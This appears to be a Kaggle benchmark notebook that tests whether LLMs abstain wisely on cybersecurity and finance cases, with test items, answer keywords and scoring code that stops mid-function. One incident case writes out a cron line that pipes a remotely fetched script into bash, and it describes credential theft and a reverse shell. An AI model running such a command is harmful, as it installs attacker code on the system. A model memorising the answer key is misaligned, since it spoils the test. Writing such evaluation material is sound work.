"""MC-2: Selective Abstention — asymmetric payoff test for LLM metacognition."""

# %%
!pip install -q kaggle-benchmarks

# %%
import kaggle_benchmarks as kbench
from dataclasses import dataclass, asdict

# %%
@dataclass
class AbstentionResponse:
    decision: str               # "answer" or "abstain"
    answer: str                 # the answer if answering, empty string if abstaining
    specialist_referral: str    # type of specialist or empty string
    missing_information: list[str]
    confidence: float
    reasoning: str

# %%
ITEMS = [
    # === ANSWERABLE (model should answer) ===
    {
        "id": "abs_cyber_001", "domain": "cybersecurity", "answerability": "answerable", "difficulty": 1,
        "case": """A security scanner flags an AWS S3 bucket named "company-public-assets" with public read access (Principal: "*"), Block Public Access OFF. Contents: /images/ (780 files), /css/ (34 files), /js/ (18 files) — all website static assets served via CloudFront CDN. BUT also /backup/ directory with: database-export-2026-03-01.sql.gz (4.2 GB), .env.production, and aws-credentials.csv. The bucket is the CloudFront origin for the marketing website.""",
        "question": "What is the security risk level and what should be done?",
        "answer_keywords": ["high", "critical", "credentials", "remove backup", "rotate", "exposed", "sensitive"],
    },
    {
        "id": "abs_cyber_002", "domain": "cybersecurity", "answerability": "answerable", "difficulty": 2,
        "case": """During a Linux server audit (Ubuntu 22.04), a cron job is found under www-data: */5 * * * * curl -s http://45.33.32.156:8443/update.sh | bash. The IP is on a bulletproof hosting provider. Created 23 days ago. The update.sh script downloads xmrig (cryptominer), adds an SSH key to /root/.ssh/authorized_keys, exfiltrates /etc/passwd and /etc/shadow, and installs a reverse shell. CPU has been at 94% for 23 days (was 15%). The server runs WordPress with 3 unpatched vulnerable plugins.""",
        "question": "What has happened to this server and what should be the response?",
        "answer_keywords": ["compromised", "cryptominer", "backdoor", "isolate", "rebuild", "wordpress", "credential", "rotate"],
    },
    {
        "id": "abs_fin_001", "domain": "finance", "answerability": "answerable", "difficulty": 1,
        "case": "30yo software engineer, $150K income, no debt. $50K savings (emergency fund), $20K in 401(k) with 50% employer match up to 6%. Currently contributing 3%.",
        "question": "What is the most impactful first step for investments?",
        "answer_keywords": ["increase 401k", "6%", "employer match", "free money", "roth ira"],
    },

    # === AMBIGUOUS (reasonable to answer or abstain) ===
    {
        "id": "abs_cyber_003", "domain": "cybersecurity", "answerability": "ambiguous", "difficulty": 4,
        "case": """Network monitoring detects unusual traffic from dev-ml-01 (10.0.8.55): 800MB-1.2GB daily outbound to CloudFront IPs for 12 days. HTTPS POST bursts every 4 hours (40-60 requests, 3-4MB each). Server previously had near-zero external traffic. It runs an ML pipeline processing proprietary customer data.

A developer says they "added W&B (Weights & Biases) telemetry" but has no ticket/approval. Normal W&B telemetry is <10MB/day. SNI shows "api.wandb.ai" on some requests but ECH (encrypted) on others. DNS logs also show queries to "ml-sync.dataflow-analytics[.]io" — registered 14 days ago via privacy registrar. The developer "used a script from a blog post" and doesn't remember details.""",
        "question": "Is this legitimate ML telemetry, data exfiltration, or something else? What action should be taken?",
        "answer_keywords": ["ambiguous", "uncertain", "investigate", "suspicious", "exfiltration", "cannot determine", "forensic"],
    },
    {
        "id": "abs_fin_002", "domain": "finance", "answerability": "ambiguous", "difficulty": 4,
        "case": "Biotech ($800M mcap), single Phase 3 drug, readout in 2 weeks. Price $42, target $85 (approve) or $8 (fail). Analyst success estimates 35-65%. CMO sold $2.4M (10b5-1 plan, 8mo old). Company raised $150M for 'commercial launch preparations.'",
        "question": "Should a moderate-risk-tolerance client invest ahead of the readout?",
        "answer_keywords": ["binary", "uncertain", "coin flip", "risk", "both sides"],
    },

    # === SPECIALIST REQUIRED (model should abstain) ===
    {
        "id": "abs_cyber_004", "domain": "cybersecurity", "answerability": "specialist", "difficulty": 5,
        "case": """During a supply chain security audit, 3 of 200 network switches (Arista 7280R3) have UEFI firmware that doesn't match the vendor's reference hash — 247 bytes larger. Strings analysis shows an extra EFI DXE driver with x86 assembly hooking network stack initialization. At boot, the switches transmit 3 UDP packets to a hardcoded IP (203.0.113.47:53) before the management interface initializes, then no further anomalous traffic. All 3 switches from the same pallet; the other 197 match reference hashes. Arista says "no knowledge of modifications." Tamper-evident seals appeared intact.""",
        "question": "Is this a nation-state supply chain implant, manufacturing defect, or QA artifact? Should these switches be deployed?",
        "answer_keywords": ["specialist", "forensic", "reverse engineering", "quarantine", "do not deploy", "cannot determine", "abstain", "defer", "CISA"],
    },
    {
        "id": "abs_cyber_005", "domain": "cybersecurity", "answerability": "specialist", "difficulty": 3,
        "case": """EDR flags svchost_helper.exe in C:\\Users\\jsmith\\AppData\\Local\\Temp\\. Unsigned, 1.8MB. VirusTotal: 3/72 detections (Kaspersky: Trojan.Generic, Avira: TR/Agent). Strings: HTTP POST, hardcoded IP, CreateRemoteThread, VirtualAllocEx, WriteProcessMemory. High entropy (7.2). Developer jsmith works on Windows platform team and says it's a "test build for the crash dump collector using process injection." His Git shows commits to a crash-collector branch, but the binary hash doesn't match a build from branch HEAD. Manager confirms the project is approved.""",
        "question": "Is svchost_helper.exe malware or a legitimate development artifact?",
        "answer_keywords": ["insufficient", "cannot determine", "reverse engineer", "quarantine", "binary analysis", "compare", "abstain", "defer"],
    },
    {
        "id": "abs_fin_003", "domain": "finance", "answerability": "specialist", "difficulty": 5,
        "case": "US multinational hedging €500M annual revenue. Options: 12mo forward, zero-cost collar (25-delta), participating forward (50%), or cross-currency swap on €300M debt. Has intercompany transfer pricing under IRS audit. Mixed tax rates 12.5-30% across EU subs.",
        "question": "Which hedging strategy maximizes after-tax cash flow while maintaining ASC 815 hedge accounting eligibility?",
        "answer_keywords": ["specialist", "complex", "derivatives", "tax", "ASC 815", "cannot determine", "abstain", "defer"],
    },

    # === NEW CYBERSECURITY + FINANCE ITEMS ===
    {
        "id": "abs_cyber_006",
        "domain": "cybersecurity",
        "answerability": "answerable",
        "difficulty": 1,
        "case": """A developer commits an AWS access key (AKIA...) and secret key directly into a public GitHub repository for a startup's main product. The commit was pushed 47 minutes ago. GitHub's secret scanning sent an alert, but no one has responded yet. The key belongs to an IAM user "deploy-prod" with the managed policy AdministratorAccess attached. CloudTrail shows no unauthorized API calls from this key pair yet. The repository has 230 stars and 18 forks. The company uses this AWS account for all production infrastructure including RDS databases with customer PII, S3 buckets with financial documents, and EKS clusters running their SaaS platform.""",
        "question": "What is the severity and what immediate actions should be taken?",
        "answer_keywords": ["critical", "rotate", "revoke", "immediately", "invalidate", "exposed", "administrator", "git history", "secrets scanning"],
    },
    {
        "id": "abs_cyber_007",
        "domain": "cybersecurity",
        "answerability": "answerable",
        "difficulty": 2,
        "case": """During a quarterly access review for a healthcare SaaS company (HIPAA-regulated), the following anomalies are found in the IAM system: (1) 14 user accounts belonging to employees who left the company 3-9 months ago still have active credentials, including 3 with access to the production database containing PHI (Protected Health Information). (2) A service account "etl-legacy" has not been used in 188 days but retains read/write access to all patient record tables. (3) 6 engineer accounts have standing MFA exemptions that were granted as "temporary" 14 months ago with no documented reason. (4) The "intern-2025-summer" group still has 8 members with staging environment access; the internship ended 5 months ago. The system uses Okta for SSO with SCIM provisioning, but the SCIM connector to the HR system (Workday) has been in "degraded" status for 4 months due to an unresolved schema mapping issue.""",
        "question": "What are the compliance risks and what remediation steps should be prioritized?",
        "answer_keywords": ["HIPAA", "violation", "disable", "deactivate", "terminated", "MFA", "access review", "least privilege", "SCIM", "remediate", "PHI"],
    },
    {
        "id": "abs_cyber_008",
        "domain": "cybersecurity",
        "answerability": "answerable",
        "difficulty": 1,
        "case": """A vulnerability scan of an internet-facing web application returns the following critical findings: (1) The login page at /api/auth/login accepts credentials over HTTP (port 80) with no redirect to HTTPS — TLS is configured on port 443 but not enforced. (2) The server response headers include "Server: Apache/2.4.49" — this version is affected by CVE-2021-41773, a path traversal vulnerability with a CVSS score of 9.8 and known active exploitation. (3) The /api/users endpoint returns full user records including hashed passwords (bcrypt) and email addresses when queried with any valid session token, with no pagination limit — a single GET returns all 34,000 user records. (4) Session cookies are set without the Secure, HttpOnly, or SameSite attributes. The application is a customer portal for a B2B software company with 340 enterprise clients.""",
        "question": "Rank these findings by severity and recommend immediate actions.",
        "answer_keywords": ["critical", "CVE-2021-41773", "path traversal", "patch", "upgrade", "HTTPS", "enforce TLS", "API", "rate limit", "cookie", "secure flag"],
    },
    {
        "id": "abs_cyber_009",
        "domain": "cybersecurity",
        "answerability": "answerable",
        "difficulty": 2,
        "case": """An organization's email gateway logs show a spear-phishing campaign targeting 12 executives over the past 48 hours. The emails originate from "ceo-firstname.lastname@company-corp.com" (the real domain is "company.com"). The emails reference a real upcoming board meeting (date and agenda items are accurate) and contain a link to "https://company-sharepoint.com/board-deck-Q1.pptx" — a typosquatted domain registered 3 days ago. DNS lookup shows the typosquat domain points to 185.220.101.34, an IP associated with Cobalt Strike C2 infrastructure per threat intelligence feeds. Two executives clicked the link: the CFO (12 hours ago) and the VP of Legal (6 hours ago). Both are on corporate-managed Windows laptops with CrowdStrike Falcon EDR. CrowdStrike shows no detections on either machine, but the CFO's laptop made 3 DNS queries to "update-check.company-sharepoint.com" in the hour after the click that do not appear in any other corporate device's DNS logs. The VP of Legal's laptop shows no anomalous indicators.""",
        "question": "What is the likely threat level and what incident response steps should be taken?",
        "answer_keywords": ["spear-phishing", "compromise", "insider knowledge", "isolate", "CFO", "forensic", "credential reset", "C2", "Cobalt Strike", "contain"],
    },

    # =========================================================================
    # CYBERSECURITY — AMBIGUOUS (D3-D4)
    # =========================================================================
    {
        "id": "abs_cyber_010",
        "domain": "cybersecurity",
        "answerability": "ambiguous",
        "difficulty": 3,
        "case": """A cloud security posture management (CSPM) tool flags a Lambda function "data-processor-v2" in a production AWS account. The function has an IAM role with s3:*, dynamodb:*, and kms:Decrypt permissions — overly broad by least-privilege standards. The function processes 2.3 million events per day for a critical real-time analytics pipeline. The engineering team argues: (1) the function legitimately reads from 14 S3 buckets and writes to 7 DynamoDB tables, all in the same account; (2) they tried scoping permissions tighter 6 months ago but it caused a production outage when a new table was added and the policy wasn't updated in time; (3) they have compensating controls — VPC-restricted execution, resource-based policies on the S3 buckets, and CloudTrail monitoring with alerts. The security team counters that wildcard permissions violate their cloud security policy, SOC 2 auditors flagged a similar finding last year, and the next audit is in 5 weeks. There is no automated mechanism to generate least-privilege policies from CloudTrail access patterns in this organization.""",
        "question": "Should the permissions be tightened before the audit or should the compensating controls be documented as sufficient?",
        "answer_keywords": ["trade-off", "risk", "compensating controls", "least privilege", "SOC 2", "outage", "pragmatic", "both", "uncertain"],
    },
    {
        "id": "abs_cyber_011",
        "domain": "cybersecurity",
        "answerability": "ambiguous",
        "difficulty": 4,
        "case": """A threat intelligence analyst discovers that the company's production Kubernetes cluster API server (EKS) was briefly accessible on the public internet for approximately 90 minutes due to a Terraform misconfiguration during a maintenance window at 3:17 AM. The API server requires a valid bearer token for authentication — anonymous auth is disabled. Access logs during the window show: 847 connection attempts from 62 unique IPs (all on known scanner ranges like Shodan, Censys, and Shadowserver), 23 attempts that reached the authentication layer (received 401 Unauthorized), and zero successful authentications. However, the EKS audit logs have a 4-minute gap from 3:42-3:46 AM due to a known CloudWatch ingestion delay that occurs during high-volume periods. The cluster runs 340 pods across 28 namespaces handling payment processing, user authentication, and internal microservices. No anomalous pod behavior, no unexpected images pulled, no changes to RBAC bindings, and no alerts from Falco (runtime security). The security team is debating whether to declare a security incident and rotate all service account tokens (which requires a coordinated 4-hour maintenance window affecting customers) or to close this as a near-miss.""",
        "question": "Should this be treated as a confirmed incident requiring full token rotation, or a near-miss requiring only remediation of the Terraform configuration?",
        "answer_keywords": ["uncertain", "gap", "audit log", "risk tolerance", "cannot confirm", "conservative", "proportionate", "both defensible"],
    },
    {
        "id": "abs_cyber_012",
        "domain": "cybersecurity",
        "answerability": "ambiguous",
        "difficulty": 4,
        "case": """A security operations center (SOC) analyst notices that a senior database administrator (DBA) has been querying the production customer database at unusual hours — between 11 PM and 2 AM — for the past 9 days. The queries are SELECT statements against the customers, transactions, and payment_methods tables with no WHERE clause (full table scans), exporting results to CSV on the DBA's workstation. Total data exported: approximately 4.7 GB across 2.1 million customer records including names, emails, partial credit card numbers (last 4 digits), and transaction histories. The DBA has legitimate access; their role requires this level of database access. When asked, the DBA explains they are building a data quality report requested by the VP of Engineering for a planned database migration from PostgreSQL to CockroachDB. The VP of Engineering confirms they discussed a migration feasibility study but says "I told them to use a sample, not the full dataset." The DBA says they "misunderstood the scope." There is no DLP solution monitoring database exports, and the company's acceptable use policy does not explicitly address bulk data exports by authorized personnel. The DBA has been with the company for 6 years with no prior incidents.""",
        "question": "Is this a data exfiltration incident, a policy gap issue, or a benign misunderstanding? What action should be taken?",
        "answer_keywords": ["ambiguous", "insider threat", "possible", "unclear intent", "investigate", "cannot determine", "policy gap", "proportionate"],
    },
    {
        "id": "abs_cyber_013",
        "domain": "cybersecurity",
        "answerability": "ambiguous",
        "difficulty": 3,
        "case": """A penetration test report for a financial services company's mobile banking app identifies the following: the app uses certificate pinning but pins to a leaf certificate expiring in 4 months with no automated rotation mechanism. The API implements rate limiting at 100 requests per minute per IP but has no per-account rate limiting — an attacker with a botnet could perform credential stuffing distributed across thousands of IPs. The app's biometric authentication (Face ID/Touch ID) falls back to a 4-digit PIN after 3 failed biometric attempts. The app stores an encrypted refresh token in the iOS Keychain (kSecAttrAccessibleAfterFirstUnlock), which means the token is available when the device is locked but powered on. The pen test team rates the overall risk as "Medium" but the CISO wants to delay the upcoming release by 3 weeks to fix everything. The product team argues the risk is theoretical — there are no known exploits combining these weaknesses, the app has 2.8 million active users, and a 3-week delay costs an estimated $1.2M in revenue and pushes past a regulatory compliance deadline for a new feature.""",
        "question": "Should the release be delayed to remediate all findings or should the app ship with documented accepted risks and a remediation timeline?",
        "answer_keywords": ["trade-off", "risk acceptance", "business", "both valid", "depends", "regulatory deadline", "prioritize", "uncertain"],
    },

    # =========================================================================
    # CYBERSECURITY — SPECIALIST (D4-D5)
    # =========================================================================
    {
        "id": "abs_cyber_014",
        "domain": "cybersecurity",
        "answerability": "specialist",
        "difficulty": 5,
        "case": """During an incident response engagement, a forensic examiner images the RAM of a compromised Windows Server 2022 domain controller using WinPmem. Volatility 3 analysis of the memory dump reveals: (1) An unsigned kernel driver "wdfilter2.sys" loaded at address 0xFFFFF80716A30000 — Microsoft's legitimate WdFilter.sys is also loaded at a different address. The rogue driver hooks SSDT entry 0x55 (NtQueryDirectoryFile) and SSDT entry 0x36 (NtQuerySystemInformation), suggesting rootkit behavior to hide files and processes. (2) A process "lsass.exe" (PID 892) has an injected DLL that doesn't appear on disk — the DLL contains code patterns matching a custom credential harvester that patches WDigest to force plaintext credential caching. (3) The domain controller's NTDS.dit file was accessed by a process that no longer exists in the process list. Event logs show Kerberos TGT requests for 14 service accounts within a 90-second window at 02:14 AM, consistent with a DCSync attack pattern, but the source IP logged is 127.0.0.1 (loopback), meaning the attack originated from the DC itself. (4) Three Group Policy Objects were modified at 02:17 AM: one disables Windows Defender across the domain, one adds a scheduled task to all servers, and one modifies the default domain password policy.""",
        "question": "What is the full scope of the compromise, what specific malware family is this, and can the domain be recovered without a full rebuild?",
        "answer_keywords": ["specialist", "forensic", "reverse engineering", "cannot determine", "abstain", "defer", "malware analysis", "memory forensics", "full rebuild", "domain compromise"],
    },
    {
        "id": "abs_cyber_015",
        "domain": "cybersecurity",
        "answerability": "specialist",
        "difficulty": 5,
        "case": """A manufacturing company's OT (Operational Technology) security team detects anomalous Modbus TCP traffic on their SCADA network. A Siemens S7-1500 PLC (firmware V2.9.4) controlling a chemical mixing process is receiving write commands (Function Code 0x10 — Write Multiple Registers) to holding registers 40001-40016, which control valve positions and temperature setpoints. The commands originate from IP 10.100.3.22, which is an authorized engineering workstation, but the workstation's operator denies issuing commands and was not logged in at the time. The PLC's web interface shows the last configuration change was 6 hours ago, but the PLC's diagnostic buffer has been cleared — an operation requiring Level 3 (HMI) access. Network captures show the write commands adjust the mixing ratio of two chemicals: hydrochloric acid concentration setpoint changed from 12.5% to 31.0% and the agitator speed reduced from 1200 RPM to 300 RPM. The safety instrumented system (SIS) running on a separate Triconex controller has not alarmed because the modified values are within the wide engineering limits, though far outside normal operating parameters. Physical access logs show 3 employees badged into the OT control room in the relevant timeframe.""",
        "question": "Is this a cyberattack on the industrial process, an insider threat, or an engineering error? What should be done to the process and the investigation?",
        "answer_keywords": ["specialist", "OT security", "ICS", "SCADA", "physical inspection", "cannot determine remotely", "abstain", "defer", "safety", "process engineer", "forensic"],
    },
    {
        "id": "abs_cyber_016",
        "domain": "cybersecurity",
        "answerability": "specialist",
        "difficulty": 4,
        "case": """A mobile security researcher captures network traffic from a company-issued iPhone running iOS 17.3 and discovers the device is making TLS 1.3 connections to 23 IP addresses that do not resolve to any known domain via reverse DNS. The connections occur every 15-30 minutes, transfer 2-8 KB of data each time, and use certificate pinning that prevents MITM inspection even with a trusted root CA installed. The connections persist even when all user-installed apps are force-quit. The IPs are distributed across 8 ASNs in 5 countries (US, Ireland, Singapore, Japan, Netherlands). Some IPs are in ranges allocated to Apple, but 7 are in ranges belonging to Akamai, Cloudflare, and Amazon. Comparing with a freshly wiped iPhone on the same iOS version, the baseline device contacts 18 of the same 23 IPs, but not the remaining 5. The 5 unique IPs are in the Akamai (2), Amazon (2), and Cloudflare (1) ranges. The device has 47 apps installed including 3 MDM-deployed enterprise apps. The company suspects a zero-click exploit may have been deployed via iMessage targeting their executive team after a threat intel vendor warned of a campaign against their industry vertical.""",
        "question": "Do the 5 unique IP connections indicate device compromise by a zero-click exploit, or are they benign CDN connections from installed apps?",
        "answer_keywords": ["specialist", "mobile forensics", "cannot determine", "abstain", "defer", "MVT", "iVerify", "forensic toolkit", "live analysis", "insufficient information"],
    },
    {
        "id": "abs_cyber_017",
        "domain": "cybersecurity",
        "answerability": "specialist",
        "difficulty": 5,
        "case": """A government contractor undergoes a CMMC Level 2 (Cybersecurity Maturity Model Certification) assessment. The assessor identifies a complex data flow issue: CUI (Controlled Unclassified Information) is processed in an Azure GovCloud environment, but telemetry data from the application (including performance metrics, error messages, and stack traces) flows to a Datadog monitoring instance hosted in Datadog's commercial US multi-tenant SaaS. The contractor argues: (1) telemetry is metadata, not CUI; (2) stack traces are sanitized to remove CUI before transmission using a custom middleware filter; (3) Datadog has a FedRAMP Moderate authorization for their GovCloud offering but the contractor uses the commercial tier for cost reasons. The assessor is uncertain: the sanitization filter's effectiveness has not been independently validated, error messages could contain CUI fragments (e.g., file paths, partial record identifiers), and NIST SP 800-171 Rev 2 control 3.1.20 requires CUI to reside only in authorized locations. The assessment is due in 10 business days. The contractor has 14,000 employees and $2.3B in active DoD contracts contingent on CMMC certification.""",
        "question": "Does this telemetry flow constitute a CMMC control failure, and can the sanitization filter be accepted as a compensating control?",
        "answer_keywords": ["specialist", "CMMC", "assessor", "cannot determine", "abstain", "defer", "legal", "compliance", "NIST 800-171", "FedRAMP", "validation required"],
    },

    # =========================================================================
    # FINANCE — ANSWERABLE (D1-D2)
    # =========================================================================
    {
        "id": "abs_fin_004",
        "domain": "finance",
        "answerability": "answerable",
        "difficulty": 1,
        "case": """A 28-year-old teacher with a $62,000 annual salary has $18,000 in credit card debt across three cards: Card A: $8,500 balance at 24.99% APR (minimum payment $170), Card B: $6,200 balance at 19.99% APR (minimum payment $124), Card C: $3,300 balance at 14.99% APR (minimum payment $66). She is currently paying minimum payments on all three ($360/month total). She recently received a $5,000 year-end bonus and can allocate an additional $300/month above minimums toward debt repayment. Her credit score is 680 and she has been pre-approved for a balance transfer card with 0% APR for 18 months (3% transfer fee, $20,000 limit). She has $4,000 in a savings account (her only emergency fund) and no retirement savings.""",
        "question": "What is the optimal debt repayment strategy?",
        "answer_keywords": ["balance transfer", "avalanche", "highest interest", "24.99%", "transfer fee", "emergency fund", "save on interest"],
    },
    {
        "id": "abs_fin_005",
        "domain": "finance",
        "answerability": "answerable",
        "difficulty": 2,
        "case": """A married couple (both 42) earns a combined $310,000 gross annually. They have: (1) $180,000 in 401(k) accounts combined — both contributing 4% with 50% employer match up to 6%. (2) A $520,000 mortgage at 3.1% fixed, 24 years remaining. (3) $85,000 in a taxable brokerage account (70% VTSAX, 30% individual stocks). (4) $45,000 in a 529 plan for their 8-year-old child. (5) No Roth IRAs. (6) $30,000 in a high-yield savings account earning 4.5% APY. Their marginal federal tax rate is 24%. They expect their income to increase to ~$400,000 within 5 years due to career trajectories (which would put them in the 32% bracket). They want to retire at 60 and have asked whether they should (A) maximize 401(k) contributions, (B) pay extra on the mortgage, (C) fund Roth IRAs via backdoor conversion, or (D) increase the 529 contributions.""",
        "question": "How should they prioritize these four options?",
        "answer_keywords": ["401k match", "6%", "backdoor Roth", "tax diversification", "do not pay extra mortgage", "3.1%", "low rate", "maximize", "retirement"],
    },
    {
        "id": "abs_fin_006",
        "domain": "finance",
        "answerability": "answerable",
        "difficulty": 2,
        "case": """A small business owner (sole proprietorship, Schedule C) has net self-employment income of $195,000 for the tax year. She currently has no retirement accounts. She is 38, has no employees, and wants to maximize her tax-deferred retirement savings. She is evaluating: (1) SEP-IRA: allows contributions up to 25% of net self-employment earnings (after the self-employment tax deduction). (2) Solo 401(k): allows employee deferrals up to $23,500 plus employer contributions up to 25% of net self-employment earnings. (3) SIMPLE IRA: allows $16,000 employee contribution plus 3% employer match. She has no plans to hire employees in the next 3 years. She also wants to know if she can additionally contribute to a traditional or Roth IRA. Her MAGI with the retirement contribution deduction would be approximately $155,000-$165,000 (depending on which plan she chooses). She is single with no other income sources.""",
        "question": "Which retirement plan allows the maximum tax-deferred contribution, and can she additionally fund an IRA?",
        "answer_keywords": ["Solo 401k", "maximize", "employee deferral", "employer contribution", "higher limit", "SEP-IRA lower", "backdoor Roth", "income too high", "traditional IRA deduction"],
    },

    # =========================================================================
    # FINANCE — AMBIGUOUS (D3-D4)
    # =========================================================================
    {
        "id": "abs_fin_007",
        "domain": "finance",
        "answerability": "ambiguous",
        "difficulty": 4,
        "case": """A 55-year-old executive has a concentrated stock position: 62% of her $4.8M net worth ($2.98M) is in her employer's stock (a publicly traded tech company, current price $187/share, 15,930 shares). Her cost basis varies: 4,000 shares at $12 (ISO exercise from 2014), 6,000 shares at $45 (RSU vests 2017-2019), and 5,930 shares from RSU vests at $120-$165 (2021-2024). She is a Section 16 insider subject to trading windows and pre-clearance. Her next open window is in 6 weeks and lasts 14 business days. The stock has a beta of 1.4, P/E of 38, and the company reports earnings during her next trading window. Analyst consensus is "overweight" with a $215 price target, but the company recently lost a major government contract worth $340M annually and has an ongoing SEC investigation into revenue recognition practices. She needs $1.2M liquid within 18 months for a real estate purchase. She is evaluating: (A) selling shares during the next window, (B) an exchange fund, (C) a 10b5-1 plan, (D) a prepaid variable forward contract, or (E) a charitable remainder trust for the low-basis shares.""",
        "question": "Which diversification strategy should she pursue?",
        "answer_keywords": ["complex", "trade-offs", "insider", "tax implications", "multiple valid", "depends", "risk tolerance", "SEC investigation", "uncertain", "10b5-1"],
    },
    {
        "id": "abs_fin_008",
        "domain": "finance",
        "answerability": "ambiguous",
        "difficulty": 3,
        "case": """A 50-year-old couple is deciding between two retirement strategies. Option A: Retire at 55 with $2.1M in retirement accounts, a paid-off house worth $650K, and $180K in taxable accounts. They would draw down $95,000/year (4.5% withdrawal rate initially) and purchase ACA marketplace health insurance at approximately $1,800/month until Medicare at 65. Their estimated Social Security at 62 is $2,400/month combined, or $3,600/month at 67 (full retirement age). Option B: Work until 60, at which point their retirement accounts would grow to an estimated $3.2M (assuming 7% real returns and continued contributions of $50K/year), house paid off, $350K in taxable accounts. They would draw $110,000/year (3.4% withdrawal rate) and have employer health coverage until 60, then 5 years of ACA. Their Social Security at 62 would be $2,800/month combined, or $4,100/month at 67. They both dislike their current jobs but are not miserable. Their health is good. They want to travel extensively. Annual spending is currently $105,000 including $24,000 mortgage payment (3 years remaining). Inflation assumption: 3%. Life expectancy assumption: 90.""",
        "question": "Should they retire at 55 or work until 60?",
        "answer_keywords": ["trade-off", "withdrawal rate", "4.5% high", "sequence risk", "health insurance", "personal", "both viable", "depends", "lifestyle", "uncertain"],
    },

    # =========================================================================
    # FINANCE — SPECIALIST (D4-D5)
    # =========================================================================
    {
        "id": "abs_fin_009",
        "domain": "finance",
        "answerability": "specialist",
        "difficulty": 5,
        "case": """A US-resident dual citizen (US/Germany) with €2.4M in a German Kapitalgesellschaft (GmbH) wholly owned by him is considering restructuring. The GmbH holds: (1) €1.1M in German real estate (3 rental apartments in Munich, generating €78,000/year gross rental income), (2) €800K in a German brokerage account (mix of EU-domiciled ETFs classified as Investmentfonds under the German InvStG 2018), and (3) €500K in retained earnings from a consulting business that is winding down. He wants to relocate to the US full-time within 12 months and is evaluating: (A) liquidating the GmbH before the move, triggering German Abgeltungsteuer (25% + 5.5% Solidaritätszuschlag) on distributions and potential US tax under the treaty; (B) maintaining the GmbH as a CFC (Controlled Foreign Corporation) under IRC Subpart F / GILTI, with annual Form 5471 reporting; (C) converting to a German KG (Kommanditgesellschaft) which may be treated as a flow-through entity for US tax purposes; (D) contributing the assets to a US LLC taxed as a partnership and electing under the US-Germany tax treaty. Each option has different implications under PFIC rules for the ETFs, FIRPTA for the real estate, German Grunderwerbsteuer (real estate transfer tax) at 3.5-6.5% depending on structure, and US foreign tax credit limitations under IRC Section 904. He also has €180K in German social security contributions (gesetzliche Rentenversicherung) and a German Riester-Rente with €45,000 balance.""",
        "question": "Which restructuring option minimizes the combined US-German tax burden while maintaining compliance with both jurisdictions?",
        "answer_keywords": ["specialist", "cross-border tax", "cannot determine", "abstain", "defer", "CPA", "Steuerberater", "tax attorney", "treaty", "PFIC", "CFC", "jurisdiction-specific"],
    },
    {
        "id": "abs_fin_010",
        "domain": "finance",
        "answerability": "specialist",
        "difficulty": 5,
        "case": """An insurance broker presents a 62-year-old business owner with a complex estate planning strategy combining life insurance and annuities. The proposal: (1) Purchase a $5M survivorship (second-to-die) life insurance policy inside an Irrevocable Life Insurance Trust (ILIT). Premium: $87,000/year for 12 years (guaranteed paid-up). The insured parties are the business owner (62, rated Preferred) and spouse (59, rated Standard due to controlled Type 2 diabetes with A1C of 6.8). (2) Fund the premiums using a split-dollar arrangement with the business owner's S-Corp under the economic benefit regime (Treas. Reg. 1.61-22). (3) Simultaneously, purchase a $2M private placement variable annuity (PPVA) inside a completed-gift trust, invested in a hedge fund strategy. The PPVA is intended to grow tax-deferred with assets eventually distributed to grandchildren. (4) Use annual gift tax exclusions ($18,000 per beneficiary) plus a portion of the lifetime exemption ($13.61M in 2024) for Crummey withdrawals and the PPVA gift. The business owner's current estate is valued at $14.2M (including the S-Corp valued at $6.8M via a recent 409A valuation). Two children, five grandchildren. The state of residence is Oregon, which has a $1M estate tax exemption with rates up to 16%.""",
        "question": "Is this estate plan optimal, and are there risks with the IRS challenging the split-dollar arrangement or the PPVA trust structure?",
        "answer_keywords": ["specialist", "estate planning attorney", "actuary", "cannot determine", "abstain", "defer", "IRS scrutiny", "split-dollar", "PPVA", "audit risk", "Oregon estate tax"],
    },
    {
        "id": "abs_fin_011",
        "domain": "finance",
        "answerability": "specialist",
        "difficulty": 4,
        "case": """A quantitative hedge fund is evaluating a volatility arbitrage strategy. They observe that 3-month implied volatility on the S&P 500 (VIX term structure) is at 18.2%, while their proprietary realized volatility forecast model (using HAR-RV with jump components and overnight/intraday decomposition) estimates 3-month realized volatility at 14.8%, suggesting implied vol is 340 bps rich. Their proposed trade: sell 3-month SPX straddles delta-hedged continuously, with gamma scalping. Notional: $200M. However: (1) the current VIX term structure is in contango (front month 16.1%, 3-month 18.2%, 6-month 19.7%), which historically has mean-reverted within 40 trading days 72% of the time per their backtest. (2) The variance risk premium (VRP) is at its 78th percentile vs. 10-year history. (3) Skew is steep: 25-delta put implied vol is 24.1% vs. 25-delta call at 14.8%. (4) Their model's out-of-sample R-squared for 3-month RV forecasts is 0.31 with a mean absolute error of 2.8 vol points. (5) Upcoming macro events: FOMC in 3 weeks, CPI next week, and presidential election in 6 weeks. (6) Transaction costs for continuous delta hedging are estimated at 1.2 vol points annually. (7) The fund's current Sharpe is 1.4 with max drawdown of 8.2%; this trade at $200M would represent 15% of AUM.""",
        "question": "Should the fund execute this trade at the proposed size, and what is the expected P&L distribution accounting for model uncertainty and upcoming events?",
        "answer_keywords": ["specialist", "quant", "cannot determine", "abstain", "defer", "model risk", "proprietary", "backtest", "insufficient", "risk management"],
    },
]

# %%
@kbench.task(store_task=False)
def ask_abstention(llm, prompt: str) -> dict:
    """Fresh chat context per item to avoid context accumulation."""
    resp = llm.prompt(prompt, schema=AbstentionResponse)
    return asdict(resp)

# %%
@kbench.task(name="mc2_selective_abstention")
def selective_abstention_benchmark(llm) -> float:
    """Tests knowledge boundary detection with asymmetric payoffs. Returns normalized score (0-1)."""

    CORRECT_REWARD = 10.0
    INCORRECT_PENALTY = -50.0
    ABSTENTION_COST = -2.0

    total_score = 0.0
    n_correct = 0
    n_incorrect = 0
    n_abstained = 0

    for item in ITEMS:
        prompt = f"""You are an expert advisor evaluated on decision quality.

SCORING RULES:
- Correct answer: +10 points
- INCORRECT answer: -50 points
- ABSTAIN (defer to specialist): -2 points

Only answer when confident. Abstaining is much better than being wrong.

## Case
{item['case']}

## Question
{item['question']}

Respond in JSON: {{"decision": "answer|abstain", "answer": "your answer or empty string if abstaining", "specialist_referral": "specialist type or empty string", "missing_information": ["..."], "confidence": 0.0-1.0, "reasoning": "..."}}"""

        run_result = ask_abstention.run(llm=llm, prompt=prompt)
        resp = run_result.result if hasattr(run_result, 'result') else run_result

        if resp["decision"].lower() == "abstain":
            total_score += ABSTENTION_COST
            n_abstained += 1
            decision_str = "ABSTAIN"

            # For specialist-required items, abstaining is GOOD
            if item["answerability"] == "specialist":
                kbench.assertions.assert_true(
                    True,
                    expectation=f"[{item['id']}] Correctly abstained on specialist-level question"
                )
        else:
            # Check answer correctness
